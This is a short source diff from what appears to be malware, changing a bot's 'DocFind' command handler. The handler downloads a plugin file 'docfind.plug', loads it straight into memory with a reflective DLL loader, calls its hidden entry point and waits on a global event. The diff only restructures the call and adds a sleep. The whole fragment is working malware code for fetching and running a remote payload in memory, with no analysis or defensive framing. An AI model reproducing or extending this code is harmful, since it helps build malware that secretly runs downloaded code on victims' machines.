@@ -747,7 +747,7 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 
 bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 {
-	typedef BOOL (WINAPI *typeBuildStubDllMain)(HANDLE DllHandle, DWORD Reason, LPVOID );
+	typedef BOOL (WINAPI *TFindMethod)(HANDLE DllHandle, DWORD Reason, LPVOID);
 	BYTE* data = 0;
 	DWORD size = 0;
 	data = Plugin::Download( "docfind.plug", 0, &size, false );
@@ -758,17 +758,14 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 		HMEMORYMODULE module = MemoryLoadLibrary(data);
 		if( module )
 		{
-			DWORD* gAltEPOffs = (DWORD*) MemoryGetProcAddress( module, "gAltEPOffs" );
-			if( gAltEPOffs )
+			TFindMethod Func = *(TFindMethod*)MemoryGetProcAddress(module, "gAltEPOffs" );
+			if(Func)
 			{
-				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
-				if( func )
-				{
-					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
-					func( 0, DLL_PROCESS_ATTACH, 0 );
-					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
-					pCloseHandle(hEvent);
-				}
+				HANDLE Event = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
+				Func(NULL, DLL_PROCESS_ATTACH, NULL);
+				pWaitForSingleObject(Event, INFINITE);
+                pSleep(7000);
+				pCloseHandle(Event);
 			}
 			MemoryFreeLibrary(module);
 		}
